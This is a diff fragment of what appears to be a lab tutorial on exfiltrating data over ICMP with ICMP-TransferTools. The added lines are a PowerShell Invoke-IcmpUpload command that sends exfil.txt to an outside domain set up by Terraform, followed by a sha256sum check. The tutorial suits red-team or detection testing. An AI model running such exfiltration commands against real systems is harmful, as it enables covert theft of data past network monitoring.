@@ -340,3 +340,16 @@ python3 ICMP-ReceiveFile.py 5.62.23.6 exfil.txt
 On the client import copy and paste the function listed here https://github.com/icyguider/ICMP-TransferTools/blob/main/Invoke-IcmpUpload.ps1 into PowerShell ISE. Then click on the green play button. 
 
 ![Description of the image](images/30.png)
+
+On the client send the file using the below command be sure to substitute the domain for the one shown in the output of the Terraform deployment. 
+
+```powershell
+Invoke-IcmpUpload -IPAddress exfiltracer123.hulkgosmash.com -file .\exfil.txt
+```
+
+![Description of the image](images/33.png)
+
+
+```bash
+sha256sum exfil.txt
+```
